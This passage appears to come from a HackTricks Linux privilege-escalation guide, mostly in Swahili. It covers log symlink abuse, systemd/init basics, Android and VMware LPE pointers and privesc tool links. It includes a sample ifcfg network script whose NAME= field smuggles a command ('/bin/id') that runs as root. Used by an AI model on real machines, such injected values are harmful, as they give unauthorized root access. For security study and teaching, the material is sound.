Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hiyo kila unapogundua kuwa unaweza kubadilisha logs, angalia ni nani anayezisimamia logs hizo na angalia kama unaweza kuongeza privileges kwa kubadilisha logs na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote ile, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** iliyopo, basi **system yako imepwned**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumiwa kwa network connections. Zinafanana kabisa na faili za .INI. Hata hivyo, hu~source~iwa kwenye Linux na Network Manager (dispatcher.d).

Kwa upande wangu, sifa ya `NAME=` katika network scripts hizi haishughulikiwi kwa usahihi. Ukiwa na white/blank space kwenye jina, system hujaribu kutekeleza sehemu iliyo baada ya white/blank space. Hii inamaanisha kuwa **kila kitu baada ya blank space ya kwanza hutekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

Saraka `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa kawaida wa usimamizi wa huduma wa Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kuendeshwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, **usimamizi wa huduma** mpya zaidi ulioletwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, scripts za SysVinit bado zinatumika pamoja na usanidi wa Upstart kwa sababu ya compatibility layer katika Upstart.

**systemd** huibuka kama initializer na service manager ya kisasa, ikitoa features za hali ya juu kama vile kuanzisha daemon kwa ombi, usimamizi wa automount, na system state snapshots. Hupanga faili ndani ya `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa mabadiliko ya administrator, hivyo kurahisisha mchakato wa system administration.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kawaida hu-hook syscall ili kufichua privileged kernel functionality kwa user-space manager. Weak manager authentication (kwa mfano, signature checks zinazotegemea FD-order au poor password schemes) zinaweza kuruhusu local app kujifanya manager na kufanya privilege escalation hadi root kwenye devices ambazo tayari ni rooted. Jifunze zaidi na exploitation details hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwa process command lines na kui-execute kwa -v chini ya privileged context. Permissive patterns (kwa mfano, kutumia \S) zinaweza ku-match attacker-staged listeners kwenye writable locations (kwa mfano, /tmp/httpd), na kusababisha execution kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone generalized pattern inayotumika kwa stacks nyingine za discovery/monitoring hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
